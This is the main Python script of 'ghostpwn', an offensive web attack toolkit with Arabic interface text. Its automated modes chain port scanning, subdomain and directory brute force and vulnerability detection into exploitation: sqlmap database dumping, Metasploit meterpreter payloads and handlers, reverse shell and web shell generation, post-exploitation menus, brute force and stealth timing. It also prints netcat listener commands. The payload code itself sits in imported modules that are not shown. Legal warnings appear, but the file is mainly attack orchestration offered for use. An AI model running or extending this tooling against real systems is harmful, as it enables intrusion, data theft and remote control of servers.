#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
██████   ██  █████  ██   ██ ███████ ██      ██████   ██████
██   ██  ██ ██   ██  ██ ██  ██      ██      ██   ██ ██    ██
███████  ██ ███████   ███   █████   ██      ██████  ██    ██
██   ██  ██ ██   ██  ██ ██  ██      ██      ██   ██ ██    ██
██   ██  ██ ██   ██  ██   ██ ███████ ███████ ██████   ██████

ghostpwn v1.0 - Zero-Dependency Web Penetration Testing Toolkit

⚠️  تنبيه قانوني:
  استخدم فقط على مواقع تملكها أو لديك إذن صريح بفحصها.

✨ المميزات:
  - بدون أي أدوات خارجية (مفيش nmap, sqlmap, nikto, ffuf, etc.)
  - يعتمد فقط على Python standard library
  - 13+ module لفحص الثغرات
  - Reverse shell + Web shell generator
  - Reports: HTML + JSON + CSV
  - يعمل على أي نظام فيه Python 3.6+
"""
import argparse
import os
import sys
import time
import json

# إضافة مجلد modules لـ path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.http_client import HttpClient
from modules.port_scanner import PortScanner
from modules.vuln_detector import VulnDetector
from modules.crawler import Crawler, DirectoryBruteForcer, SubdomainBruteForcer, TechDetector
from modules.report_generator import generate_full_report
from modules.payload_generator import (
    REVERSE_SHELLS, WEB_SHELLS,
    list_reverse_shells, list_web_shells,
    generate_reverse_shell, generate_web_shell,
    generate_all_reverse_shells,
)
from modules.auto_pentest import AutoPentest
from modules.session_cleanup import SessionCleanup
from modules.wizard import Wizard
from modules.profiles import PROFILES, get_profile, list_profiles
from modules.config import Config
from modules.updater import Updater
from modules.help_system import HelpSystem
from modules.progress import ProgressBar


# ----------------------------- Banner -----------------------------
def print_banner():
    print("""
\x1b[1;31m
  ██████   ██  █████  ██   ██ ███████ ██      ██████   ██████
  ██   ██  ██ ██   ██  ██ ██  ██      ██      ██   ██ ██    ██
  ███████  ██ ███████   ███   █████   ██      ██████  ██    ██
  ██   ██  ██ ██   ██  ██ ██  ██      ██      ██   ██ ██    ██
  ██   ██  ██ ██   ██  ██   ██ ███████ ███████ ██████   ██████
\x1b[0m
\x1b[1;36m  Zero-Dependency Web Penetration Testing Toolkit v1.0\x1b[0m
\x1b[0;90m  Pure Python Standard Library | No external tools needed\x1b[0m
""")


# ----------------------------- Colors -----------------------------
class Colors:
    if sys.stdout.isatty():
        RED = '\033[1;31m'
        GREEN = '\033[1;32m'
        YELLOW = '\033[1;33m'
        BLUE = '\033[1;34m'
        MAGENTA = '\033[1;35m'
        CYAN = '\033[1;36m'
        BOLD = '\033[1m'
        GRAY = '\033[0;90m'
        NC = '\033[0m'
    else:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = BOLD = GRAY = NC = ''


def log_info(msg):    print(f"{Colors.CYAN}[*]{Colors.NC} {msg}")
def log_success(msg): print(f"{Colors.GREEN}[✓]{Colors.NC} {msg}")
def log_warn(msg):    print(f"{Colors.YELLOW}[!]{Colors.NC} {msg}")
def log_error(msg):   print(f"{Colors.RED}[✗]{Colors.NC} {msg}")
def log_phase(msg):
    print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")
    print(f"{Colors.MAGENTA}  ▶ {msg}{Colors.NC}")
    print(f"{Colors.MAGENTA}{'═'*60}{Colors.NC}")
def log_vuln(msg):
    print(f"{Colors.RED}[!] {Colors.BOLD}VULN:{Colors.NC} {msg}")


# ----------------------------- Main Scanner -----------------------------
def scan_target(url: str, options: dict) -> dict:
    """تنفيذ فحص شامل على هدف"""
    start_time = time.time()

    print_banner()
    print(f"\n{Colors.BOLD}الهدف:{Colors.NC} {url}")
    print(f"{Colors.BOLD}عمق الفحص:{Colors.NC} {options['depth']}")
    print(f"{Colors.BOLD}Threads:{Colors.NC} {options['threads']}")
    print(f"{Colors.BOLD}Timeout:{Colors.NC} {options['timeout']}s")
    if options.get('proxy'):
        print(f"{Colors.BOLD}Proxy:{Colors.NC} {options['proxy']}")
    if options.get('cookie'):
        print(f"{Colors.BOLD}Cookie:{Colors.NC} [set]")
    print()

    # تأكيد قانوني
    print(f"{Colors.YELLOW}⚠️  تنبيه قانوني:{Colors.NC}")
    print(f"  استخدم الأداة فقط على مواقع تملكها أو لديك إذن صريح بفحصها.")
    print(f"  الاستخدام غير المصرح به جريمة يعاقب عليها القانون.\n")

    # إعداد HTTP client
    client = HttpClient(
        timeout=options['timeout'],
        user_agent=options.get('user_agent', 'ghostpwn/1.0'),
        proxy=options.get('proxy'),
        cookie=options.get('cookie'),
        delay=options.get('delay', 0),
    )

    extra_data = {}
    all_vulns = []

    # 1) Tech Detection
    if not options.get('skip_tech'):
        log_phase("1. كشف التكنولوجيا (Tech Detection)")
        detector = TechDetector(client)
        tech = detector.detect(url)
        if tech:
            log_success(f"التكنولوجيا المكتشفة: {', '.join(tech)}")
            extra_data["tech_stack"] = tech
        else:
            log_warn("لم يتم اكتشاف تكنولوجيا واضحة")

    # 2) Port Scan
    if not options.get('skip_port'):
        log_phase("2. فحص البورتات (Port Scan)")
        hostname = url.split("//")[-1].split("/")[0].split(":")[0]
        scanner = PortScanner(timeout=2.0, max_threads=options['threads'])
        ports_to_scan = "top100" if options['depth'] == 'fast' else "top1000" if options['depth'] == 'medium' else "full"
        open_ports = scanner.scan(hostname, ports_to_scan)
        if open_ports:
            log_success(f"تم العثور على {len(open_ports)} بورت مفتوح")
            extra_data["open_ports"] = open_ports
        else:
            log_warn("لا توجد بورتات مفتوحة")

    # 3) Subdomain Brute Force
    if not options.get('skip_subdomain'):
        log_phase("3. اكتشاف Subdomains")
        hostname = url.split("//")[-1].split("/")[0].split(":")[0]
        sub_bruter = SubdomainBruteForcer(threads=50)
        subdomains = sub_bruter.brute(hostname)
        if subdomains:
            log_success(f"تم العثور على {len(subdomains)} subdomain")
            extra_data["subdomains"] = subdomains
        else:
            log_warn("لم يتم العثور على subdomains")

    # 4) Crawler
    if not options.get('skip_crawl'):
        log_phase("4. الزحف للموقع (Crawler)")
        crawler = Crawler(client, max_depth=2 if options['depth'] != 'deep' else 3,
                         max_pages=30 if options['depth'] != 'deep' else 100)
        crawl_data = crawler.crawl(url)
        log_success(f"Pages: {crawl_data['stats']['total_pages']} | "
                   f"URLs: {crawl_data['stats']['total_urls']} | "
                   f"Forms: {crawl_data['stats']['total_forms']} | "
                   f"Emails: {crawl_data['stats']['emails_found']}")
        extra_data["crawler_data"] = crawl_data

    # 5) Directory Brute Force
    if not options.get('skip_dir'):
        log_phase("5. اكتشاف المجلدات (Directory Brute)")
        dir_bruter = DirectoryBruteForcer(client, threads=options['threads'])
        directories = dir_bruter.brute(url)
        if directories:
            log_success(f"تم العثور على {len(directories)} مسار")
            extra_data["directories"] = directories
        else:
            log_warn("لم يتم العثور على مسارات")

    # 6) Vulnerability Detection
    if not options.get('skip_vuln'):
        log_phase("6. فحص الثغرات (Vulnerability Detection)")
        detector = VulnDetector(client)
        # فحص URL الرئيسي
        vulns = detector.run_all(url)
        # فحص URLs إضافية من الـ crawler
        if extra_data.get("crawler_data", {}).get("urls_with_params"):
            for url_data in extra_data["crawler_data"]["urls_with_params"][:3]:
                if url_data["url"] != url:
                    log_info(f"فحص URL إضافي: {url_data['url'][:80]}")
                    detector.vulns_found = []  # reset for next URL
                    extra_vulns = detector.run_all(url_data["url"])
                    all_vulns.extend(extra_vulns)
        all_vulns.extend(vulns)

    # 7) Summary
    log_phase("خلاصة الثغرات المكتشفة")
    if all_vulns:
        sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for v in all_vulns:
            sev = v.get("severity", "info")
            if sev in sev_counts:
                sev_counts[sev] += 1

        print(f"\n  {Colors.BOLD}تم اكتشاف {len(all_vulns)} نتيجة:{Colors.NC}\n")
        for sev, count in sev_counts.items():
            if count > 0:
                color = {"critical": Colors.RED, "high": Colors.RED,
                        "medium": Colors.YELLOW, "low": Colors.BLUE, "info": Colors.GRAY}[sev]
                label = {"critical": "حرج", "high": "عالي", "medium": "متوسط",
                        "low": "منخفض", "info": "معلومة"}[sev]
                print(f"  {color}{label}: {count}{Colors.NC}")

        print(f"\n  {Colors.BOLD}أول 10 ثغرات:{Colors.NC}")
        for i, v in enumerate(all_vulns[:10], 1):
            sev = v.get("severity", "info")
            color = {"critical": Colors.RED, "high": Colors.RED,
                    "medium": Colors.YELLOW, "low": Colors.BLUE, "info": Colors.GRAY}.get(sev, Colors.NC)
            print(f"  {i}. {color}[{sev}]{Colors.NC} {v.get('type', 'unknown')} - {v.get('url', '')[:60]}")
    else:
        log_success("لم يتم اكتشاف ثغرات واضحة")

    # 8) Generate Reports
    log_phase("توليد التقارير")
    duration = time.time() - start_time
    reports = generate_full_report(
        url, all_vulns, extra_data,
        duration, options['depth'],
        options.get('output', 'reports')
    )
    log_success(f"تم حفظ التقارير في:")
    print(f"  {Colors.BOLD}JSON:{Colors.NC} {reports['json']}")
    print(f"  {Colors.BOLD}HTML:{Colors.NC} {reports['html']}")
    print(f"  {Colors.BOLD}CSV:{Colors.NC}  {reports['csv']}")

    print(f"\n{Colors.GREEN}[✓] اكتمل الفحص في {duration:.1f} ثانية{Colors.NC}")

    return {
        "vulns": all_vulns,
        "extra_data": extra_data,
        "duration": duration,
        "reports": reports,
    }


# ----------------------------- Interactive Menu -----------------------------
def interactive_menu():
    """Interactive TUI menu"""
    print_banner()

    print(f"{Colors.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.NC}")
    print(f"{Colors.CYAN}  🎯  القائمة التفاعلية  {Colors.NC}")
    print(f"{Colors.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.NC}")
    print()
    print(f"  {Colors.BOLD}1.{Colors.NC} فحص سريع (fast)")
    print(f"  {Colors.BOLD}2.{Colors.NC} فحص متوسط (medium)")
    print(f"  {Colors.BOLD}3.{Colors.NC} فحص عميق (deep)")
    print(f"  {Colors.BOLD}4.{Colors.NC} فحص ثغرات فقط (بدون port/crawl)")
    print(f"  {Colors.BOLD}5.{Colors.NC} توليد Reverse Shell")
    print(f"  {Colors.BOLD}6.{Colors.NC} توليد Web Shell")
    print(f"  {Colors.BOLD}7.{Colors.NC} عرض الـ Shells المتاحة")
    print(f"  {Colors.BOLD}8.{Colors.NC} فحص بورتات فقط")
    print(f"  {Colors.BOLD}9.{Colors.NC} فحص subdomains فقط")
    print(f"  {Colors.BOLD}0.{Colors.NC} خروج")
    print(f"\n{Colors.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.NC}")

    try:
        choice = input(f"\n{Colors.BOLD}اختر رقم (0-9): {Colors.NC}").strip()
    except (KeyboardInterrupt, EOFError):
        print("\nbye!")
        return

    if choice == "0":
        return
    elif choice in ("1", "2", "3"):
        try:
            url = input(f"{Colors.BOLD}أدخل URL: {Colors.NC}").strip()
        except (KeyboardInterrupt, EOFError):
            return
        if not url:
            log_error("URL مطلوب")
            return
        if not url.startswith("http"):
            url = "http://" + url
        depth = {"1": "fast", "2": "medium", "3": "deep"}[choice]
        options = {
            "depth": depth,
            "threads": 10,
            "timeout": 15,
            "output": "reports",
        }
        scan_target(url, options)
    elif choice == "4":
        try:
            url = input(f"{Colors.BOLD}أدخل URL: {Colors.NC}").strip()
        except (KeyboardInterrupt, EOFError):
            return
        if not url.startswith("http"):
            url = "http://" + url
        options = {
            "depth": "medium", "threads": 10, "timeout": 15, "output": "reports",
            "skip_port": True, "skip_crawl": True, "skip_subdomain": True,
            "skip_tech": True, "skip_dir": True,
        }
        scan_target(url, options)
    elif choice == "5":
        try:
            ip = input(f"{Colors.BOLD}Listener IP: {Colors.NC}").strip()
            port = int(input(f"{Colors.BOLD}Listener Port: {Colors.NC}").strip())
            print(f"\n{Colors.BOLD}الأنواع المتاحة:{Colors.NC}")
            list_reverse_shells()
            shell_type = input(f"\n{Colors.BOLD}اختر نوع (default: bash): {Colors.NC}").strip() or "bash"
        except (KeyboardInterrupt, EOFError, ValueError):
            return
        shell = generate_reverse_shell(shell_type, ip, port)
        if shell:
            print(f"\n{Colors.GREEN}{shell}{Colors.NC}")
            print(f"\n{Colors.CYAN}[*] شغّل listener:{Colors.NC} nc -lvnp {port}")
        else:
            log_error(f"نوع غير معروف: {shell_type}")
    elif choice == "6":
        try:
            print(f"\n{Colors.BOLD}الأنواع المتاحة:{Colors.NC}")
            list_web_shells()
            shell_type = input(f"\n{Colors.BOLD}اختر نوع (default: php): {Colors.NC}").strip() or "php"
            password = input(f"{Colors.BOLD}Password (default: ghost): {Colors.NC}").strip() or "ghost"
            output = input(f"{Colors.BOLD}Output file (default: shell.{shell_type.split('-')[0]}): {Colors.NC}").strip()
            if not output:
                ext = "php" if shell_type.startswith("php") else shell_type.split("-")[0]
                output = f"shell.{ext}"
        except (KeyboardInterrupt, EOFError):
            return
        shell = generate_web_shell(shell_type, password)
        if shell:
            with open(output, "w") as f:
                f.write(shell)
            log_success(f"Shell saved: {output}")
            print(f"{Colors.YELLOW}[!] ارفع الملف للموقع يدوياً{Colors.NC}")
        else:
            log_error(f"نوع غير معروف: {shell_type}")
    elif choice == "7":
        list_reverse_shells()
        print()
        list_web_shells()
    elif choice == "8":
        try:
            hostname = input(f"{Colors.BOLD}Hostname/IP: {Colors.NC}").strip()
            ports = input(f"{Colors.BOLD}Ports (default: top100): {Colors.NC}").strip() or "top100"
        except (KeyboardInterrupt, EOFError):
            return
        scanner = PortScanner(timeout=2.0)
        results = scanner.scan(hostname, ports)
        print(f"\n{Colors.GREEN}[✓] Found {len(results)} open ports{Colors.NC}")
    elif choice == "9":
        try:
            domain = input(f"{Colors.BOLD}Domain: {Colors.NC}").strip()
        except (KeyboardInterrupt, EOFError):
            return
        sub_bruter = SubdomainBruteForcer(threads=50)
        results = sub_bruter.brute(domain)
        print(f"\n{Colors.GREEN}[✓] Found {len(results)} subdomains{Colors.NC}")
    else:
        log_error("اختيار غير صالح")


# ----------------------------- Main -----------------------------
def main():
    parser = argparse.ArgumentParser(
        description="ghostpwn - Zero-Dependency Web Penetration Testing Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
أمثلة:
  %(prog)s https://target.com --pwn                    # هجوم شامل أوتوماتيكي (sqlmap + metasploit)
  %(prog)s https://target.com --pwn --listener-ip IP   # مع metasploit reverse shell
  %(prog)s --interactive                                # قائمة تفاعلية
  %(prog)s https://target.com                           # فحص متوسط
  %(prog)s https://target.com --depth=deep             # فحص عميق
  %(prog)s https://target.com --skip-port              # بدون فحص بورتات
  %(prog)s --reverse bash --ip 10.0.0.1 --port 4444
  %(prog)s --webshell php --output shell.php
  %(prog)s --list-reverse                               # عرض كل الـ reverse shells
"""
    )
    parser.add_argument("url", nargs="?", help="Target URL")
    parser.add_argument("--pwn", action="store_true",
                       help="Full automated attack: scan + exploit + sqlmap + metasploit + post-exploit")
    parser.add_argument("--ghost", action="store_true",
                       help="Ultimate full attack: IP breakthrough + scan + FP killer + orchestrate + sqlmap + metasploit + post-exploit")
    parser.add_argument("--interactive", "-i", action="store_true", help="Interactive TUI menu")
    parser.add_argument("--wizard", "-w", action="store_true", help="Interactive wizard (guided)")
    parser.add_argument("--auto", action="store_true",
                       help="Full automatic pentest (scan + exploit)")
    parser.add_argument("--profile", choices=list(PROFILES.keys()),
                       help="Use a scan profile (quick/standard/deep/stealth/etc)")
    parser.add_argument("--update", action="store_true",
                       help="Check for updates")
    parser.add_argument("--config", action="store_true",
                       help="Show current configuration")
    parser.add_argument("--help-topic", help="Show help on specific topic")
    parser.add_argument("--stealth", choices=["low", "medium", "high"],
                       help="Stealth mode (low-noise scanning)")
    parser.add_argument("--cleanup", action="store_true",
                       help="Clean local temp files (preserves audit logs)")
    parser.add_argument("--brute", action="store_true",
                       help="Enable brute force attacks (SSH/FTP/HTTP)")
    parser.add_argument("--dump-db", action="store_true",
                       help="Auto dump database if SQLi found")
    parser.add_argument("--deploy-shell", action="store_true",
                       help="Auto deploy reverse shell if RCE found")
    parser.add_argument("--listener-ip", help="Listener IP for reverse shell")
    parser.add_argument("--listener-port", type=int, default=4444,
                       help="Listener port for reverse shell (default: 4444)")
    parser.add_argument("--full", action="store_true",
                       help="Full auto mode (exploit + brute + dump + shell)")
    parser.add_argument("--depth", default="medium", choices=["fast", "medium", "deep"],
                       help="Scan depth (default: medium)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout (default: 15)")
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--user-agent", default="ghostpwn/1.0", help="Custom User-Agent")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests (anti-DoS)")
    parser.add_argument("--output", default="reports", help="Reports directory (default: reports)")

    # Skip flags
    parser.add_argument("--skip-port", action="store_true", help="Skip port scanning")
    parser.add_argument("--skip-crawl", action="store_true", help="Skip crawling")
    parser.add_argument("--skip-dir", action="store_true", help="Skip directory brute force")
    parser.add_argument("--skip-vuln", action="store_true", help="Skip vulnerability detection")
    parser.add_argument("--skip-subdomain", action="store_true", help="Skip subdomain brute force")
    parser.add_argument("--skip-tech", action="store_true", help="Skip tech detection")

    # Payload generation
    parser.add_argument("--reverse", help="Generate reverse shell (type)")
    parser.add_argument("--webshell", help="Generate web shell (type)")
    parser.add_argument("--ip", help="Listener IP for reverse shell")
    parser.add_argument("--port", type=int, help="Listener port")
    parser.add_argument("--password", default="ghost", help="Web shell password")
    parser.add_argument("--list-reverse", action="store_true", help="List reverse shells")
    parser.add_argument("--list-web", action="store_true", help="List web shells")
    parser.add_argument("--all-reverse", action="store_true", help="Generate all reverse shells")

    args = parser.parse_args()

    # Update mode
    if args.update:
        updater = Updater()
        updater.check_and_update(auto=False)
        return

    # Config mode
    if args.config:
        config = Config()
        config.print_config()
        return

    # Help topic
    if args.help_topic:
        help_sys = HelpSystem()
        help_sys.show_help(args.help_topic)
        return

    # Cleanup mode
    if args.cleanup:
        cleanup = SessionCleanup(".")
        result = cleanup.full_local_cleanup(keep_audit=True)
        cleanup.print_summary()
        return

    # Payload generation modes
    if args.list_reverse:
        list_reverse_shells()
        return
    if args.list_web:
        list_web_shells()
        return
    if args.reverse and args.ip and args.port:
        shell = generate_reverse_shell(args.reverse, args.ip, args.port)
        if shell:
            print(shell)
            print(f"\n[*] Listener: nc -lvnp {args.port}", file=sys.stderr)
        else:
            log_error(f"Unknown type: {args.reverse}")
            list_reverse_shells()
        return
    if args.webshell:
        shell = generate_web_shell(args.webshell, args.password)
        if shell:
            output = args.output if args.output != "reports" else f"shell.{args.webshell.split('-')[0]}"
            with open(output, "w") as f:
                f.write(shell)
            log_success(f"Shell saved: {output}")
        else:
            log_error(f"Unknown type: {args.webshell}")
            list_web_shells()
        return
    if args.all_reverse and args.ip and args.port:
        output = f"shells_{args.ip}_{args.port}.txt"
        generate_all_reverse_shells(args.ip, args.port, output)
        log_success(f"All shells saved: {output}")
        return

    # Wizard mode (new default)
    if args.wizard or (not args.url and not args.auto and not args.full
                       and not args.pwn and not args.ghost and not args.interactive
                       and not args.list_reverse and not args.list_web
                       and not args.reverse and not args.webshell
                       and not args.all_reverse):
        wizard = Wizard()
        wizard.main_menu()
        return

    # --ghost mode: Ultimate full attack
    if args.ghost:
        if not args.url:
            log_error("--ghost يتطلب URL")
            return
        url = args.url
        if not url.startswith("http"):
            url = "http://" + url

        log_phase("👻 GHOST MODE - العملية الشاملة الكاملة")
        log_info(f"الهدف: {url}")
        log_warn("⚠️  استخدم فقط على مواقع لديك إذن بفحصها!")
        print()

        # Import all needed modules
        from modules.ip_breakthrough import IPBreakthrough
        from modules.full_auto import FullAutoScanner
        from modules.false_positive_killer import FalsePositiveKiller
        from modules.attack_orchestrator import AttackOrchestrator
        from modules.sqlmap_integration import SQLmapIntegration
        from modules.metasploit_integration import MetasploitIntegration
        from modules.post_exploit_menu import PostExploitMenu

        # Phase 0: IP Breakthrough - إيجاد الـ IP الحقيقي
        log_phase("Phase 0: إيجاد الـ IP الحقيقي (15 طريقة)")
        ip_finder = IPBreakthrough()
        ip_result = ip_finder.find(url)
        ip_finder.print_report()

        # Phase 1: الفحص الشامل
        log_phase("Phase 1: الفحص الشامل")
        options = {
            "depth": args.depth,
            "threads": args.threads,
            "timeout": args.timeout,
            "proxy": args.proxy,
            "cookie": args.cookie,
            "user_agent": args.user_agent,
            "output": args.output,
            "auto_exploit": True,
            "listener_ip": args.listener_ip,
            "listener_port": args.listener_port,
        }

        scanner = FullAutoScanner(url, options)
        scan_result = scanner.run()

        print(f"\n{Colors.GREEN}[✓] اكتمل الفحص{Colors.NC}")
        print(f"  الثغرات الأولية: {len(scanner.all_vulns)}")

        # Phase 2: False Positive Killer
        log_phase("Phase 2: إزالة النتائج الكاذبة")
        fp_killer = FalsePositiveKiller(scanner.client)
        verified_vulns = fp_killer.filter_vulns(scanner.all_vulns, url)

        print(f"  {Colors.GREEN}مؤكدة: {len(verified_vulns)}{Colors.NC}")
        print(f"  {Colors.YELLOW}مُزالة: {len(scanner.all_vulns) - len(verified_vulns)}{Colors.NC}")

        # Phase 3: Attack Orchestration
        log_phase("Phase 3: تنظيم الهجوم الذكي")
        orchestrator = AttackOrchestrator()
        orchestrate_result = orchestrator.orchestrate(
            url, verified_vulns,
            http_client=scanner.client,
            listener_ip=args.listener_ip,
            listener_port=args.listener_port,
        )
        orchestrator.print_report(orchestrate_result)

        # Phase 4: sqlmap (لو فيه SQLi)
        sqli_vulns = [v for v in verified_vulns if "sql_injection" in v.get("type", "")]
        if sqli_vulns:
            log_phase("Phase 4: استغلال SQLi بـ sqlmap")
            sqlmap = SQLmapIntegration()
            if sqlmap.is_available():
                sqli_url = sqli_vulns[0].get("url", url)
                log_info(f"استغلال: {sqli_url}")
                sqlmap.full_exploit(sqli_url)
                sqlmap.print_results()
            else:
                log_warn("sqlmap غير متاح - تخطي")

        # Phase 5: Metasploit
        rce_vulns = [v for v in verified_vulns
                     if v.get("type") in ["command_injection", "ssti", "file_upload"]]
        if args.listener_ip and (rce_vulns or scan_result.get("shell_obtained")):
            log_phase("Phase 5: Metasploit exploitation")
            msf = MetasploitIntegration()
            if msf.is_available():
                msf.generate_php_meterpreter(args.listener_ip, args.listener_port)
                msf.start_handler(args.listener_ip, args.listener_port)
                msf.exploit_web_app(url, args.listener_ip, args.listener_port)
                msf.print_results()
            else:
                log_warn("Metasploit غير متاح - تخطي")

        # Phase 6: ما بعد الاختراق
        if scan_result.get("shell_obtained") and scanner.shell_url:
            log_phase("Phase 6: ما بعد الاختراق")
            menu = PostExploitMenu(scanner.client)
            menu.set_shell(scanner.shell_url)
            menu.show_menu()

        # تقرير نهائي
        log_phase("📊 التقرير النهائي")
        print(f"  {Colors.BOLD}الهدف:{Colors.NC} {url}")
        if ip_result.get("real_ip"):
            print(f"  {Colors.BOLD}الـ IP الحقيقي:{Colors.NC} {ip_result['real_ip']}")
        print(f"  {Colors.BOLD}الثغرات المؤكدة:{Colors.NC} {len(verified_vulns)}")
        print(f"  {Colors.BOLD}Shell:{Colors.NC} {'✓' if scan_result.get('shell_obtained') else '✗'}")
        if scan_result.get("reports"):
            print(f"  {Colors.BOLD}التقرير:{Colors.NC} {scan_result['reports'].get('html', '')}")
        print()

        return

    # --pwn mode: Full automated attack with sqlmap + metasploit
    if args.pwn:
        if not args.url:
            log_error("--pwn يتطلب URL")
            return
        url = args.url
        if not url.startswith("http"):
            url = "http://" + url

        log_phase("🔥 العملية الشاملة (--pwn)")
        log_info(f"الهدف: {url}")
        log_warn("⚠️  استخدم فقط على مواقع لديك إذن بفحصها!")
        print()

        # استيراد الـ modules
        from modules.full_auto import FullAutoScanner
        from modules.sqlmap_integration import SQLmapIntegration
        from modules.metasploit_integration import MetasploitIntegration
        from modules.post_exploit_menu import PostExploitMenu

        # Phase 1: الفحص الشامل
        log_phase("Phase 1: الفحص الشامل")
        options = {
            "depth": args.depth,
            "threads": args.threads,
            "timeout": args.timeout,
            "proxy": args.proxy,
            "cookie": args.cookie,
            "user_agent": args.user_agent,
            "output": args.output,
            "auto_exploit": True,
            "listener_ip": args.listener_ip,
            "listener_port": args.listener_port,
        }

        scanner = FullAutoScanner(url, options)
        scan_result = scanner.run()

        print(f"\n{Colors.GREEN}[✓] اكتمل الفحص{Colors.NC}")
        print(f"  الثغرات: {scan_result.get('vulns_count', 0)}")

        # Phase 2: sqlmap (لو فيه SQLi)
        sqli_vulns = [v for v in scanner.all_vulns if "sql_injection" in v.get("type", "")]
        if sqli_vulns:
            log_phase("Phase 2: استغلال SQLi بـ sqlmap")

            sqlmap = SQLmapIntegration()
            if sqlmap.is_available():
                # استخدام أول ثغرة SQLi
                sqli_url = sqli_vulns[0].get("url", url)
                log_info(f"استغلال: {sqli_url}")

                # استغلال كامل
                sqlmap_results = sqlmap.full_exploit(sqli_url)
                sqlmap.print_results()

                # حفظ النتائج
                if sqlmap_results.get("dumped_data"):
                    log_success("تم استخراج بيانات من قاعدة البيانات!")
            else:
                log_warn("sqlmap غير متاح - تخطي")

        # Phase 3: Metasploit (لو فيه RCE أو listener IP)
        rce_vulns = [v for v in scanner.all_vulns
                     if v.get("type") in ["command_injection", "ssti", "file_upload"]
                     or "rce" in v.get("type", "")]

        if args.listener_ip and (rce_vulns or scan_result.get("shell_obtained")):
            log_phase("Phase 3: Metasploit exploitation")

            msf = MetasploitIntegration()
            if msf.is_available():
                # توليد payload
                log_info("توليد meterpreter payload...")
                payload_file = msf.generate_php_meterpreter(
                    args.listener_ip, args.listener_port
                )

                if payload_file:
                    log_success(f"Payload: {payload_file}")
                    log_info("ارفع الـ payload على السيرفر المستهدف")

                # بدء handler
                log_info("بدء Metasploit handler...")
                msf.start_handler(args.listener_ip, args.listener_port)

                # محاولة exploitation
                msf_result = msf.exploit_web_app(url, args.listener_ip, args.listener_port)
                msf.print_results()
            else:
                log_warn("Metasploit غير متاح - تخطي")

        # Phase 4: ما بعد الاختراق
        if scan_result.get("shell_obtained") and scanner.shell_url:
            log_phase("Phase 4: ما بعد الاختراق")
            log_info("فتح قائمة التحكم...")

            menu = PostExploitMenu(scanner.client)
            menu.set_shell(scanner.shell_url)
            menu.show_menu()

        # تقرير نهائي
        log_phase("📊 التقرير النهائي")
        print(f"  {Colors.BOLD}الهدف:{Colors.NC} {url}")
        print(f"  {Colors.BOLD}الثغرات:{Colors.NC} {scan_result.get('vulns_count', 0)}")
        print(f"  {Colors.BOLD}Shell:{Colors.NC} {'✓' if scan_result.get('shell_obtained') else '✗'}")
        if scan_result.get("reports"):
            print(f"  {Colors.BOLD}التقرير:{Colors.NC} {scan_result['reports'].get('html', '')}")
        print()

        return

    # Profile mode
    if args.profile:
        if not args.url:
            log_error("--profile يتطلب URL")
            return
        url = args.url
        if not url.startswith("http"):
            url = "http://" + url

        options = get_profile(args.profile)
        options.update({
            "output": args.output,
            "user_agent": args.user_agent,
        })

        log_info(f"استخدام profile: {args.profile}")
        auto = AutoPentest(url, options)
        result = auto.run()
        print(f"\n{Colors.GREEN}[✓] اكتمل الفحص{Colors.NC}")
        return

    # Auto mode (full automatic pentest)
    if args.auto or args.full:
        if not args.url:
            log_error("--auto/--full يتطلب URL")
            return
        url = args.url
        if not url.startswith("http"):
            url = "http://" + url

        # لو --full، فعّل كل الحاجات
        if args.full:
            args.auto = True
            args.brute = True
            args.dump_db = True
            args.deploy_shell = True
            if not args.listener_ip:
                log_warn("--full يتطلب --listener-ip لـ reverse shell")

        options = {
            "depth": args.depth,
            "threads": args.threads,
            "timeout": args.timeout,
            "proxy": args.proxy,
            "cookie": args.cookie,
            "user_agent": args.user_agent,
            "delay": args.delay,
            "output": args.output,
            "auto_exploit": args.auto,
            "auto_brute": args.brute,
            "dump_db": args.dump_db,
            "deploy_shell": args.deploy_shell,
            "listener_ip": args.listener_ip,
            "listener_port": args.listener_port,
            "stealth": args.stealth,
        }

        # تطبيق stealth mode
        if args.stealth:
            log_info(f"تفعيل وضع التخفي: {args.stealth}")
            if args.stealth == "low":
                options["delay"] = max(options["delay"], 0.5)
            elif args.stealth == "medium":
                options["delay"] = max(options["delay"], 2.0)
            elif args.stealth == "high":
                options["delay"] = max(options["delay"], 5.0)

        auto = AutoPentest(url, options)
        result = auto.run()

        print(f"\n{Colors.GREEN}[✓] اكتمل الفحص الأوتوماتيكي{Colors.NC}")
        print(f"  المدة: {result['duration']}s")
        print(f"  الثغرات: {result['vulns_count']}")
        print(f"  الاستغلال الناجح: {result['exploits_count']}")
        return

    # Normal scan
    url = args.url
    if not url.startswith("http"):
        url = "http://" + url

    options = {
        "depth": args.depth,
        "threads": args.threads,
        "timeout": args.timeout,
        "proxy": args.proxy,
        "cookie": args.cookie,
        "user_agent": args.user_agent,
        "delay": args.delay,
        "output": args.output,
        "skip_port": args.skip_port,
        "skip_crawl": args.skip_crawl,
        "skip_dir": args.skip_dir,
        "skip_vuln": args.skip_vuln,
        "skip_subdomain": args.skip_subdomain,
        "skip_tech": args.skip_tech,
    }

    scan_target(url, options)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⏹️  تم الإيقاف بواسطة المستخدم{Colors.NC}")
        sys.exit(0)
    except Exception as e:
        log_error(f"خطأ غير متوقع: {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
